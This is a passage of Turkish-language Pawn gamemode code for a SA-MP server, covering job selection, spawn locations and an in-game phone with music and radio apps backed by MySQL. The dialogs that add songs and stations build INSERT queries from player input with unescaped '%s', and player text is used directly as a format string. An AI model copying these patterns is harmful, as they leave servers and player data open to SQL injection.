		AttachObjectToVehicle(GetPVarInt(playerid, "green"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		AttachObjectToVehicle(GetPVarInt(playerid, "green1"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		return 1;
	}
	if(clickedid == wTuning3[5]){
		DestroyObject(GetPVarInt(playerid, "blue"));
		DeletePVar(playerid, "neon");
		DestroyObject(GetPVarInt(playerid, "blue1"));
		DeletePVar(playerid, "neon");
		DestroyObject(GetPVarInt(playerid, "green"));
		DeletePVar(playerid, "neon");
		DestroyObject(GetPVarInt(playerid, "green1"));
		DeletePVar(playerid, "neon");
		DestroyObject(GetPVarInt(playerid, "yellow"));
		DeletePVar(playerid, "neon");
		DestroyObject(GetPVarInt(playerid, "yellow1"));
		DeletePVar(playerid, "neon");
		DestroyObject(GetPVarInt(playerid, "white"));
		DeletePVar(playerid, "neon");
		DestroyObject(GetPVarInt(playerid, "white1"));
		DeletePVar(playerid, "neon");
		DestroyObject(GetPVarInt(playerid, "pink"));
		DeletePVar(playerid, "neon");
		DestroyObject(GetPVarInt(playerid, "pink1"));
		DeletePVar(playerid, "neon");
		return 1;
	}*/
	if(clickedid == Text:INVALID_TEXT_DRAW)
	{
		for(new i = 0; i < sizeof(wTuning1); i++) { TextDrawHideForPlayer(playerid, wTuning1[i]); }
		for(new i = 0; i < sizeof(wTuning2); i++) 	{ TextDrawHideForPlayer(playerid, wTuning2[i]); }
		for(new i = 0; i < sizeof(wTuning3); i++) { TextDrawHideForPlayer(playerid, wTuning3[i]); }
		for(new i = 0; i < sizeof(wTuning4); i++) { TextDrawHideForPlayer(playerid, wTuning4[i]); }
		for(new i = 0; i < sizeof(wTuning5); i++) 	{ TextDrawHideForPlayer(playerid, wTuning5[i]); }
	}
// wtune
	return 1;
}

public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
    // Araç Sahiplik Sistemi
	Galeri_ClickPlayerTextDraw(playerid, playertextid);

	// TMMobile Sistemi Sistemi
	TMMobile_ClickPlayerTextDraw(playerid, playertextid);
	/* ESKÝ SÝSTEM
	MPUI_ClickPlayerTextDraw(playerid, playertextid);
	*/

	// MeslekUI
	if(MeslekUI_Mod[playerid] > 0)
	{
	    new Index, Float:x, Float:y, Float:z, Float:Angle;
		for(new i; i < 16; i++)
		{
		    if(playertextid == MeslekUI_Logo[playerid][i])
		    {
		        switch(MeslekUI_Mod[playerid])
		        {
		            case 1:
		            {
		                if(APlayerData[playerid][PlayerClass] == MeslekUI_Item[playerid][i]) return SendClientMessage(playerid, -1, "{FF4040}Zaten bu meslektesiniz!");
		                if(APlayerData[playerid][PlayerScore] < Meslekler[i][meslekSkor]) return SendClientMessage(playerid, -1, "{FF4040}Skorunuz bu mesleðe girebilmek için yetersiz!");
						if(MeslekUI_Item[playerid][i] == ClassPolice || MeslekUI_Item[playerid][i] == ClassFBY)
						{
						    if(APlayerData[playerid][PlayerWanted] > 0) return SendClientMessage(playerid, -1, "{FF4040}Aranýyorken Polis veya Çevik Kuvvet olamazsýnýz!");
						}
						format(APlayerData[playerid][LastMesleks], 128, APlayerData[playerid][PlayerClass]);
                        APlayerData[playerid][PlayerClass] = MeslekUI_Item[playerid][i];
		                SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Þimdi meslek kýyafetinizi seçiniz.");
		                MeslekUI_Mod[playerid] = 2;
		                MeslekUI_Show(playerid);
		            }

		            case 2:
		            {
						switch(APlayerData[playerid][PlayerClass])
						{
							case ClassTruckDriver:
							{
					 			Index = random(sizeof(ASpawnLocationsTrucker));
								x = ASpawnLocationsTrucker[Index][SpawnX];
								y = ASpawnLocationsTrucker[Index][SpawnY];
								z = ASpawnLocationsTrucker[Index][SpawnZ];
								Angle = ASpawnLocationsTrucker[Index][SpawnAngle];
								SetPlayerColor(playerid, ColorClassTruckDriver);
							}
							case ClassBusDriver:
							{
					  			Index = random(sizeof(ASpawnLocationsBusDriver));
								x = ASpawnLocationsBusDriver[Index][SpawnX];
								y = ASpawnLocationsBusDriver[Index][SpawnY];
								z = ASpawnLocationsBusDriver[Index][SpawnZ];
								Angle = ASpawnLocationsBusDriver[Index][SpawnAngle];
								SetPlayerColor(playerid, ColorClassBusDriver);
							}
							case ClassDolmusDriver:
							{
					  			Index = random(sizeof(ASpawnLocationsDolmusDriver));
								x = ASpawnLocationsDolmusDriver[Index][SpawnX];
								y = ASpawnLocationsDolmusDriver[Index][SpawnY];
								z = ASpawnLocationsDolmusDriver[Index][SpawnZ];
								Angle = ASpawnLocationsDolmusDriver[Index][SpawnAngle];
								SetPlayerColor(playerid, ColorClassDolmusDriver);
							}
							case ClassPilot:
							{
					  			Index = random(sizeof(ASpawnLocationsPilot));
								x = ASpawnLocationsPilot[Index][SpawnX];
								y = ASpawnLocationsPilot[Index][SpawnY];
								z = ASpawnLocationsPilot[Index][SpawnZ];
								Angle = ASpawnLocationsPilot[Index][SpawnAngle];
								SetPlayerColor(playerid, ColorClassPilot);
							}
							case ClassPolice:
							{
					  			Index = random(sizeof(ASpawnLocationsPolice));
								x = ASpawnLocationsPolice[Index][SpawnX];
								y = ASpawnLocationsPolice[Index][SpawnY];
								z = ASpawnLocationsPolice[Index][SpawnZ];
								Angle = ASpawnLocationsPolice[Index][SpawnAngle];
								SetPlayerColor(playerid, ColorClassPolice);
							}
							case ClassMafia:
							{
					   			Index = random(sizeof(ASpawnLocationsMafia));
								x = ASpawnLocationsMafia[Index][SpawnX];
								y = ASpawnLocationsMafia[Index][SpawnY];
								z = ASpawnLocationsMafia[Index][SpawnZ];
								Angle = ASpawnLocationsMafia[Index][SpawnAngle];
								SetPlayerColor(playerid, ColorClassMafia);
							}
							case ClassRoadWorker:
							{
					  			Index = random(sizeof(ASpawnLocationsRoadWorker));
								x = ASpawnLocationsRoadWorker[Index][SpawnX];
								y = ASpawnLocationsRoadWorker[Index][SpawnY];
								z = ASpawnLocationsRoadWorker[Index][SpawnZ];
								Angle = ASpawnLocationsRoadWorker[Index][SpawnAngle];
								SetPlayerColor(playerid, ColorClassRoadWorker);
							}
							case ClassGemici:
							{
					 			Index = random(sizeof(ASpawnLocationsGemici));
								x = ASpawnLocationsGemici[Index][SpawnX];
								y = ASpawnLocationsGemici[Index][SpawnY];
								z = ASpawnLocationsGemici[Index][SpawnZ];
								Angle = ASpawnLocationsGemici[Index][SpawnAngle];
								SetPlayerColor(playerid, ColorClassGemici);
							}
							case ClassOduncu:
							{
					  			Index = random(sizeof(ASpawnLocationsOduncu));
								x = ASpawnLocationsOduncu[Index][SpawnX];
								y = ASpawnLocationsOduncu[Index][SpawnY];
								z = ASpawnLocationsOduncu[Index][SpawnZ];
								Angle = ASpawnLocationsOduncu[Index][SpawnAngle];
								SetPlayerColor(playerid, ColorClassOduncu);
							}
							case ClassBalikci:
							{
					  			Index = random(sizeof(ASpawnLocationsBalikci));
								x = ASpawnLocationsBalikci[Index][SpawnX];
								y = ASpawnLocationsBalikci[Index][SpawnY];
								z = ASpawnLocationsBalikci[Index][SpawnZ];
								Angle = ASpawnLocationsBalikci[Index][SpawnAngle];
								SetPlayerColor(playerid, ColorClassBalikci);
							}
							case ClassCopcu:
							{
								Index = random(sizeof(ASpawnLocationsCopcu));
								x = ASpawnLocationsCopcu[Index][SpawnX]; // Get the X-position for the spawnlocation
								y = ASpawnLocationsCopcu[Index][SpawnY]; // Get the Y-position for the spawnlocation
								z = ASpawnLocationsCopcu[Index][SpawnZ]; // Get the Z-position for the spawnlocation
								Angle = ASpawnLocationsCopcu[Index][SpawnAngle]; // Get the rotation-angle for the spawnlocation
								SetPlayerColor(playerid, ColorClassCopcu);
							}
							case ClassFBY:
							{
								Index = random(sizeof(ASpawnLocationsFBY));
								x = ASpawnLocationsFBY[Index][SpawnX]; // Get the X-position for the spawnlocation
								y = ASpawnLocationsFBY[Index][SpawnY]; // Get the Y-position for the spawnlocation
								z = ASpawnLocationsFBY[Index][SpawnZ]; // Get the Z-position for the spawnlocation
								Angle = ASpawnLocationsFBY[Index][SpawnAngle]; // Get the rotation-angle for the spawnlocation
								SetPlayerColor(playerid, ColorClassFBY);
							}
							case ClassBanka:
							{
								Index = random(sizeof(ASpawnLocationsBanka));
								x = ASpawnLocationsBanka[Index][SpawnX]; // Get the X-position for the spawnlocation
								y = ASpawnLocationsBanka[Index][SpawnY]; // Get the Y-position for the spawnlocation
								z = ASpawnLocationsBanka[Index][SpawnZ]; // Get the Z-position for the spawnlocation
								Angle = ASpawnLocationsBanka[Index][SpawnAngle]; // Get the rotation-angle for the spawnlocation
								SetPlayerColor(playerid, ColorClassBanka);
							}
							case ClassFire:
							{
								Index = random(sizeof(ASpawnLocationsFire));
								x = ASpawnLocationsFire[Index][SpawnX]; // Get the X-position for the spawnlocation
								y = ASpawnLocationsFire[Index][SpawnY]; // Get the Y-position for the spawnlocation
								z = ASpawnLocationsFire[Index][SpawnZ]; // Get the Z-position for the spawnlocation
								Angle = ASpawnLocationsFire[Index][SpawnAngle]; // Get the rotation-angle for the spawnlocation
								SetPlayerColor(playerid, ColorClassFire);
							}
							case ClassPboy:
							{
					  			Index = random(sizeof(ASpawnLocationsPboy));
								x = ASpawnLocationsPboy[Index][SpawnX];
								y = ASpawnLocationsPboy[Index][SpawnY];
								z = ASpawnLocationsPboy[Index][SpawnZ];
								Angle = ASpawnLocationsPboy[Index][SpawnAngle];
								SetPlayerColor(playerid, ColorClassPboy);
							}
							case ClassKargocu:
							{
					  			Index = random(sizeof(ASpawnLocationsKargocu));
								x = ASpawnLocationsKargocu[Index][SpawnX];
								y = ASpawnLocationsKargocu[Index][SpawnY];
								z = ASpawnLocationsKargocu[Index][SpawnZ];
								Angle = ASpawnLocationsKargocu[Index][SpawnAngle];
								SetPlayerColor(playerid, ColorClassKargocu);
							}
						}
						SetSpawnInfo(playerid, 0, MeslekUI_Item[playerid][i], x, y, z, Angle, 0, 0, 0, 0, 0, 0);
						OnPlayerRequestSpawn(playerid);
						MeslekUI_Mod[playerid] = 0;
						MeslekUI_Show(playerid);
						CancelSelectTextDraw(playerid);
						SpawnPlayer(playerid);
						APlayerSpawnData[playerid] = true;
						ShowPlayerV5UI(playerid);
						TogglePlayerControllable(playerid, 1);
						Beklet(playerid);
		            }
		        }
		        break;
		    }
		}
	}
	return 1;
}

// ************************************************************************************************************************************************************
// TMMobile Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
// /skapat
CMD:skapat(playerid,params[])
{
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Müzik çalarýnýzý kapattýnýz. Tekrar müzik açmak isterseniz:");
	SendClientMessage(playerid, -1, "{FFCC00}» {FFCC00}/sac {FFFFFF}yazarak sunucuda çalan müziði");
	SendClientMessage(playerid, -1, "{FFCC00}» {FFCC00}Y {FFFFFF}Tuþuna basarak müziði veya radyo istasyonunu dinleyebilirsiniz.");
	StopAudioStreamForPlayer(playerid);
	MPMode[playerid] = 0;
	return 1;
}

// /sac
CMD:sac(playerid,params[])
{
	if(!strcmp("-", CalanMP3URL, true))
	{
	    SendClientMessage(playerid, -1, "{FF4040}Þuan sunucuda þarký çalmýyor!");
	}else{
	    MPMode[playerid] = 1;
	    StopAudioStreamForPlayer(playerid);
		PlayAudioStreamForPlayer(playerid, CalanMP3URL);
		SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Yöneticinin açtýðý müziði dinlemeye baþladýnýz");
	}
	return 1;
}

// /mp3
CMD:mp3(playerid, params[])
{
	SendAdminText(playerid, "/mp3", params);

	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Bu sistem {FFCC00}V5.0.0{FFFFFF}'dan itibaren kaldýrýlmýþtýr.");
	SendClientMessage(playerid, -1, "{FFCC00}» {FFCC00F}Y {FFFFFF}Tuþuna basarak akýllý telefonunuzu açabilirsiniz.");
    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Akýllý telefonunuzdaki {FFCC00}Müzik {FFFFFF}ve {FFCC00}Radyo {FFFFFF}uygulamalarýný kullanabilirsiniz.");
	return 1;
}

// TMMobile_ClickTextDraw
TMMobile_ClickTextDraw(playerid, Text:clickedid)
{
	// TMMobile
	if(clickedid == Text:INVALID_TEXT_DRAW && TMM_APP[playerid] != APP_Yok)
	{
		TMM_APP[playerid] = APP_Yok;
		PlayerTextDrawSetString(playerid, TMM_Baslik[playerid], "Ýphone");
		ShowTMMobile(playerid);
	}
	return 1;
}

// TMMobile_ClickPlayerTextDraw
TMMobile_ClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
	// TMMobile
	if(playertextid == PlayerText:TMM_Home[playerid] && TMM_APP[playerid] != APP_Home)
	{
		PlayerTextDrawSetString(playerid, TMM_Baslik[playerid], "TMMobile v1.0");
		TMM_APP[playerid] = APP_Home;
		ShowTMMobile(playerid);
	}

	if(playertextid == TMM_MuzikL[playerid])
	{
	    PlayerTextDrawSetString(playerid, TMM_Baslik[playerid], "Muzik");
		TMM_APP[playerid] = APP_Muzik;
		ShowTMMobile(playerid);
	}

	if(playertextid == TMM_RadyoL[playerid])
	{
        PlayerTextDrawSetString(playerid, TMM_Baslik[playerid], "Radyo");
		TMM_APP[playerid] = APP_Radyo;
		ShowTMMobile(playerid);
	}

	if(playertextid == TMM_AyarlarL[playerid])
	{
		PlayerTextDrawSetString(playerid, TMM_Baslik[playerid], "Ayarlar");
		TMM_APP[playerid] = APP_Ayarlar;
		ShowTMMobile(playerid);
	}

	if(playertextid == TMM_BankaL[playerid])
	{
		Bank_ShowMenu(playerid);
	}

	if(playertextid == TMM_KrktrL[playerid])
	{
		cmd_bilgilerim(playerid, ".");
	}

	if(playertextid == TMM_SonrakiS[playerid])
	{
		if(TMM_APP[playerid] == APP_Muzik)
		{
		    if(MPSayfa[playerid] == MuzikMaxSayfa(playerid)-1) return 1;
		    MPSayfa[playerid]++;
			MuzikListele(playerid);
		}

		if(TMM_APP[playerid] == APP_Radyo)
		{
		    if(MPSayfa[playerid] == RadyoMaxSayfa(playerid)-1) return 1;
		    MPSayfa[playerid]++;
			RadyoListele(playerid);
		}
	}

	if(playertextid == TMM_OncekiS[playerid])
	{
		if(TMM_APP[playerid] == APP_Muzik)
		{
		    if(MPSayfa[playerid] == 0) return 1;
		    MPSayfa[playerid]--;
			MuzikListele(playerid);
		}

		if(TMM_APP[playerid] == APP_Radyo)
		{
		    if(MPSayfa[playerid] == 0) return 1;
		    MPSayfa[playerid]--;
			RadyoListele(playerid);
		}
	}

	if(playertextid == TMM_YeniL[playerid])
	{
	    if(TMM_APP[playerid] == APP_Muzik)
	    {
	        if(APlayerData[playerid][PlayerLevel] == 0 && APlayerData[playerid][PlayerDjLevel] < 2 && Root[playerid] == 0) return SendClientMessage(playerid, -1, "{FF4040}Bunu sadece 2 Level DJ'ler ve Yöneticiler yapabilir!");
	        ShowPlayerDialog(playerid, DialogNewMP3Name, DIALOG_STYLE_INPUT, "{80FFFF}Müzik Ekle - Müzik Adý", "{F8F8FF}Ekleyeceðiniz müziðin adýný giriniz:", "Devam", "Ýptal");
	    }

	    if(TMM_APP[playerid] == APP_Radyo)
	    {
	        if(APlayerData[playerid][PlayerLevel] == 0 && APlayerData[playerid][PlayerDjLevel] < 2 && Root[playerid] == 0) return SendClientMessage(playerid, -1, "{FF4040}Bunu sadece 2 Level DJ'ler ve Yöneticiler yapabilir!");
	        ShowPlayerDialog(playerid, DialogNewRadName, DIALOG_STYLE_INPUT, "{80FFFF}Radyo Ekle - Radyo Adý", "{F8F8FF}Ekleyeceðiniz radyo istasyonunun adýný giriniz:", "Devam", "Ýptal");
	    }
	}

	if(playertextid == TMM_AraL[playerid])
	{
	    if(TMM_APP[playerid] == APP_Muzik)
	    {
	        ShowPlayerDialog(playerid, DialogMuzikAra, DIALOG_STYLE_INPUT, "{80FFFF}Müzik Arama", "{F8F8FF}Arama metnini giriniz:", "Ara", "Ýptal");
	    }

	    if(TMM_APP[playerid] == APP_Radyo)
	    {
	        ShowPlayerDialog(playerid, DialogRadAra, DIALOG_STYLE_INPUT, "{80FFFF}Radyo Arama", "{F8F8FF}Arama metnini giriniz:", "Ara", "Ýptal");
	    }
	}

	if(TMM_APP[playerid] == APP_Muzik)
	{
		for(new i; i < 7; i++)
		{
		    if(playertextid == TMM_Item[playerid][i])
		    {
				if(MPItem[playerid][i] == -1)
				{
				    SendClientMessage(playerid, -1, "{FF4040}Bu alan boþ!");
				}else{
					MPSel[playerid] = MPItem[playerid][i];
					MuzikDialog(playerid);
				}
				break;
			}
		}
	}

	if(TMM_APP[playerid] == APP_Radyo)
	{
		for(new i; i < 7; i++)
		{
		    if(playertextid == TMM_Item[playerid][i])
		    {
				if(MPItem[playerid][i] == -1)
				{
				    SendClientMessage(playerid, -1, "{FF4040}Bu alan boþ!");
				}else{
					MPSel[playerid] = MPItem[playerid][i];
					RadyoDialog(playerid);
				}
				break;
			}
		}
	}

	if(TMM_APP[playerid] == APP_Ayarlar)
	{
		if(playertextid == TMM_Item[playerid][0]) // Þifre Deðiþtir
		{
			SendAdminText(playerid, "/sifredegistir", " ");

			if (APlayerData[playerid][LoggedIn] == true)
			{
				ShowPlayerDialog(playerid, DialogOldPassword, DIALOG_STYLE_INPUT, "Sifre Degistirme Bolumu", "Eski Sifrenizi Girini:", "OK", "Cancel");
			}
		}

		if(playertextid == TMM_Item[playerid][1]) // E-Posta Deðiþtir
		{

		}

		if(playertextid == TMM_Item[playerid][2]) // Meslek Deðiþtir
		{

		}

		if(playertextid == TMM_Item[playerid][3]) // Cihaz Arkaplaný Deðiþtir
		{
			new DiaYazi[512];
			for(new i; i < 14; i++)
			{
				format(DiaYazi, 512, "%s{F8F8FF}Arkaplan {80FFFF}%d\n", DiaYazi, i+1);
			}
			ShowPlayerDialog(playerid, DialogTMMBG, DIALOG_STYLE_LIST, "{80FFFF}Arkaplan Seç", DiaYazi, "Seç", "Ýptal");
		}
	}
	return 1;
}

// TMMobileDialogs
TMMobileDialogs(playerid, dialogid, response, listitem, inputtext[])
{
	switch(dialogid)
	{
	    case DialogMuzik:
	    {
	        if(response)
	        {
	            switch(listitem)
	            {
	                case 0, 1: // Ekleyen, Dinlenme
	                {
						switch(TMM_APP[playerid])
						{
		    				case APP_Muzik: MuzikDialog(playerid);
						    case APP_Radyo: RadyoDialog(playerid);
						}
	                }

					case 2: // Müziði Dinle
					{
					    new query[256], Cache: get_muzik, bool:Basarili = false;
						switch(TMM_APP[playerid])
						{
						    case APP_Muzik: mysql_format(Connection, query, sizeof(query), "SELECT Isim, URL FROM muzikler WHERE ID = %d", MPSel[playerid]);
						    case APP_Radyo: mysql_format(Connection, query, sizeof(query), "SELECT Isim, URL FROM radyolar WHERE ID = %d", MPSel[playerid]);
						}
						get_muzik = mysql_query(Connection, query);
					    new rows = cache_num_rows();

					    if(rows)
					    {
							cache_get_value_name(0, "Isim", MPName[playerid]);
						 	cache_get_value_name(0, "URL", MPURL[playerid]);

                            StopAudioStreamForPlayer(playerid);
							PlayAudioStreamForPlayer(playerid, MPURL[playerid]);
							MPID[playerid] = MPSel[playerid];
							MPMode[playerid] = 2;

							switch(TMM_APP[playerid])
							{
							    case APP_Muzik: SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Seçmiþ olduðunuz müziði dinlemeye baþladýnýz.");
							    case APP_Radyo: SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Seçmiþ olduðunuz radyo istasyonunu dinlemeye baþladýnýz.");
							}

							Basarili = true;
						}else{
							switch(TMM_APP[playerid])
							{
							    case APP_Muzik: SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Seçmiþ olduðunuz müzik silinmiþ!"), MuzikListele(playerid);
							    case APP_Radyo: SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Seçmiþ olduðunuz radyo istasyonu silinmiþ!"), RadyoListele(playerid);
							}
						}

						cache_delete(get_muzik);
						if(Basarili == true)
						{
							switch(TMM_APP[playerid])
							{
							    case APP_Muzik: format(query, 256, "UPDATE muzikler SET Dinlenme=Dinlenme+1 WHERE ID = %d", MPSel[playerid]);
							    case APP_Radyo: format(query, 256, "UPDATE radyolar SET Dinlenme=Dinlenme+1 WHERE ID = %d", MPSel[playerid]);
							}
							mysql_query(Connection, query);
						}
					}

					case 3: // Müziði Sunucuda Çal
					{
					    new query[256], Cache: get_muzik, bool:Basarili = false;
						switch(TMM_APP[playerid])
						{
						    case APP_Muzik: mysql_format(Connection, query, sizeof(query), "SELECT Isim, URL FROM muzikler WHERE ID = %d", MPSel[playerid]);
						    case APP_Radyo: mysql_format(Connection, query, sizeof(query), "SELECT Isim, URL FROM radyolar WHERE ID = %d", MPSel[playerid]);
						}
						get_muzik = mysql_query(Connection, query);
					    new rows = cache_num_rows();

					    if(rows)
					    {
							cache_get_value_name(0, "Isim", CalanMP3Name);
						 	cache_get_value_name(0, "URL", CalanMP3URL);

							new TMMYazi[256];

							switch(TMM_APP[playerid])
							{
							    case APP_Muzik:
							    {
									if(APlayerData[playerid][PlayerLevel] > 0 || Root[playerid] == 1)
									{
										format(TMMYazi, 256, "{FF69B4}ADMIN %s, {0BEAAE}\"%s\" {DDDDDD}þarkýsýný açtý.", GetName(playerid), CalanMP3Name);
									}else{
										if(APlayerData[playerid][PlayerDjLevel] > 0)
										{
										    format(TMMYazi, 256, "{FF69B4}DJ %s, {0BEAAE}\"%s\" {DDDDDD}þarkýsýný açtý.", GetName(playerid), CalanMP3Name);
										}
									}
							    }

							    case APP_Radyo:
							    {

									if(APlayerData[playerid][PlayerLevel] > 0 || Root[playerid] == 1)
									{
										format(TMMYazi, 256, "{FF69B4}ADMIN %s, {0BEAAE}\"%s\" {FFFFFF}radyo istasyonunu açtý.", GetName(playerid), CalanMP3Name);
									}else{
										if(APlayerData[playerid][PlayerDjLevel] > 0)
										{
										    format(TMMYazi, 256, "{FF69B4}DJ %s, {0BEAAE}\"%s\" {FFFFFF}radyo istasyonunu açtý.", GetName(playerid), CalanMP3Name);
										}
									}							    }
							}

							SendClientMessageToAll(-1, TMMYazi);
							SendClientMessageToAll(-1, "{FFCC00}» {FFFFFF}Dinlemek istemiyorsanýz {FFCC00}/skapat  {FFFFFF}veya  Müzik Çalmýyorsa {FFCC00}/sac {FFFFFF}Yazmanýz Yeterli.");

							CalanMP3ID = MPSel[playerid];
							foreach(new i:Player)
							{
						    	if(MPMode[i] == 1)
						    	{
						    		PlayAudioStreamForPlayer(i, CalanMP3URL);
								}
							}

							Basarili = true;
						}else{
							switch(TMM_APP[playerid])
							{
							    case APP_Muzik: SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Seçmiþ olduðunuz müzik silinmiþ!"), MuzikListele(playerid);
							    case APP_Radyo: SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Seçmiþ olduðunuz radyo istasyonu silinmiþ!"), RadyoListele(playerid);
							}
						}

						cache_delete(get_muzik);
						if(Basarili == true)
						{
							switch(TMM_APP[playerid])
							{
							    case APP_Muzik: format(query, 256, "UPDATE muzikler SET Dinlenme=Dinlenme+1 WHERE ID = %d", MPSel[playerid]);
							    case APP_Radyo: format(query, 256, "UPDATE radyolar SET Dinlenme=Dinlenme+1 WHERE ID = %d", MPSel[playerid]);
							}
							mysql_query(Connection, query);
						}
					}

					case 4: // Müziði Sil
					{
						switch(TMM_APP[playerid])
						{
		    				case APP_Muzik: SQL::DeleteRow("muzikler", "ID", MPSel[playerid]), SendClientMessage(playerid, -1, "{80FFFF}Seçmiþ olduðunuz müzik silindi."), MuzikListele(playerid);
						    case APP_Radyo: SQL::DeleteRow("radyolar", "ID", MPSel[playerid]), SendClientMessage(playerid, -1, "{80FFFF}Seçmiþ olduðunuz radyo istasyonu silindi."), RadyoListele(playerid);
						}
					}
				}
	        }
	    }

		case DialogMuzikAra:
		{
			if(response)
			{
				if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogMuzikAra, DIALOG_STYLE_INPUT, "{80FFFF}Müzik Arama", "{F8F8FF}Arama metnini giriniz:", "Ara", "Ýptal");
				format(MPAra[playerid], 100, inputtext);
				MPSayfa[playerid] = 0;

				switch(TMM_APP[playerid])
				{
    				case APP_Muzik: MuzikListele(playerid);
			    	case APP_Radyo: RadyoListele(playerid);
				}

				new Yazi[128];
				format(Yazi, 128, "{80FFFF}\"%s\" {F8F8FF}içeren müziði aramaya baþladýnýz.", MPAra[playerid]);
				SendClientMessage(playerid, -1, Yazi);
			}
		}

		case DialogNewMP3Name:
		{
		    if(response)
		    {
				if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogNewMP3Name, DIALOG_STYLE_INPUT, "{80FFFF}Müzik Ekle - Müzik Adý", "{F8F8FF}Ekleyeceðiniz müziðin adýný giriniz:", "Devam", "Ýptal");
				format(SelectedMP3Name[playerid], 80, inputtext);
				ShowPlayerDialog(playerid, DialogNewMP3URL, DIALOG_STYLE_INPUT, "{80FFFF}Müzik Ekle - Müzik URL", "{F8F8FF}Ekleyeceðiniz müziðin URL'sini giriniz:", "Devam", "Ýptal");
		    }
		}

		case DialogNewMP3URL:
		{
		    if(response)
		    {
				if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogNewMP3URL, DIALOG_STYLE_INPUT, "{80FFFF}Müzik Ekle - Müzik URL", "{F8F8FF}Ekleyeceðiniz müziðin URL'sini giriniz:", "Devam", "Ýptal");
				format(SelectedMP3URL[playerid], 256, inputtext);

				StopAudioStreamForPlayer(playerid);
				PlayAudioStreamForPlayer(playerid, inputtext);

				ShowPlayerDialog(playerid, DialogNewMP3Test, DIALOG_STYLE_MSGBOX, "{80FFFF}Müzik Ekle - Test", "{F8F8FF}Linkin çalýþýp çalýþmadýðýný kontrol edin. Çalýþmýyorsa geri tuþuna basýn.", "Ekle", "Geri");
		    }
		}

		case DialogNewMP3Test:
		{
		    if(response)
		    {
		        new query[512];
				StopAudioStreamForPlayer(playerid);
				mysql_format(Connection, query, sizeof(query), "INSERT INTO muzikler SET Isim='%s', URL='%s', Ekleyen='%s', Dinlenme='0'", SelectedMP3Name[playerid], SelectedMP3URL[playerid], GetName(playerid));
				mysql_query(Connection, query);

				SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Arþive yeni müzik eklediniz.");

				MuzikListele(playerid);
		    }else{
		        StopAudioStreamForPlayer(playerid);
		        ShowPlayerDialog(playerid, DialogNewMP3URL, DIALOG_STYLE_INPUT, "{80FFFF}Müzik Ekle - Müzik URL", "{F8F8FF}Ekleyeceðiniz müziðin URL'sini giriniz:", "Devam", "Ýptal");
		    }
		}

		case DialogRadAra:
		{
			if(response)
			{
				if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogRadAra, DIALOG_STYLE_INPUT, "{80FFFF}Radyo Arama", "{F8F8FF}Arama metnini giriniz:", "Ara", "Ýptal");
				format(MPAra[playerid], 100, inputtext);
				MPSayfa[playerid] = 0;
				MuzikListele(playerid);

				new Yazi[128];
				format(Yazi, 128, "{80FFFF}\"%s\" {F8F8FF}içeren radyo istasyonunu aramaya baþladýnýz.", MPAra[playerid]);
				SendClientMessage(playerid, -1, Yazi);
			}
		}

		case DialogNewRadName:
		{
		    if(response)
		    {
				if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogNewRadName, DIALOG_STYLE_INPUT, "{80FFFF}Radyo Ekle - Radyo Adý", "{F8F8FF}Ekleyeceðiniz radyo istasyonunun adýný giriniz:", "Devam", "Ýptal");
				format(SelectedMP3Name[playerid], 80, inputtext);
				ShowPlayerDialog(playerid, DialogNewRadURL, DIALOG_STYLE_INPUT, "{80FFFF}Radyo Ekle - Radyo URL", "{F8F8FF}Ekleyeceðiniz radyo istasyonunun URL'sini giriniz:", "Devam", "Ýptal");
		    }
		}

		case DialogNewRadURL:
		{
		    if(response)
		    {
				if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogNewRadURL, DIALOG_STYLE_INPUT, "{80FFFF}Radyo Ekle - Radyo URL", "{F8F8FF}Ekleyeceðiniz radyo istasyonunun URL'sini giriniz:", "Devam", "Ýptal");
				format(SelectedMP3URL[playerid], 256, inputtext);

				StopAudioStreamForPlayer(playerid);
				PlayAudioStreamForPlayer(playerid, inputtext);

				ShowPlayerDialog(playerid, DialogNewRadTest, DIALOG_STYLE_MSGBOX, "{80FFFF}Radyo Ekle - Test", "{F8F8FF}Linkin çalýþýp çalýþmadýðýný kontrol edin. Çalýþmýyorsa geri tuþuna basýn.", "Ekle", "Geri");
		    }
		}

		case DialogNewRadTest:
		{
		    if(response)
		    {
		        new query[512];
				StopAudioStreamForPlayer(playerid);
				mysql_format(Connection, query, sizeof(query), "INSERT INTO radyolar SET Isim='%s', URL='%s', Ekleyen='%s', Dinlenme='0'", SelectedMP3Name[playerid], SelectedMP3URL[playerid], GetName(playerid));
				mysql_query(Connection, query);

				SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Arþive yeni radyo istasyonu eklediniz.");

				RadyoListele(playerid);
		    }else{
		        StopAudioStreamForPlayer(playerid);
		        ShowPlayerDialog(playerid, DialogNewRadURL, DIALOG_STYLE_INPUT, "{80FFFF}Radyo Ekle - Radyo URL", "{F8F8FF}Ekleyeceðiniz radyo istasyonunun URL'sini giriniz:", "Devam", "Ýptal");
		    }
		}

		case DialogTMMBG:
		{
		    if(response)
		    {
		        TMM_BGSel[playerid] = listitem+1;
		        new BGYazi[30]; format(BGYazi, 30, "loadsc%d:loadsc%d", TMM_BGSel[playerid], TMM_BGSel[playerid]);
				PlayerTextDrawSetString(playerid, TMM_BG[playerid], BGYazi);
		    }
		}
	}
	return 1;
}

// ShowTMMobile
ShowTMMobile(playerid)
{
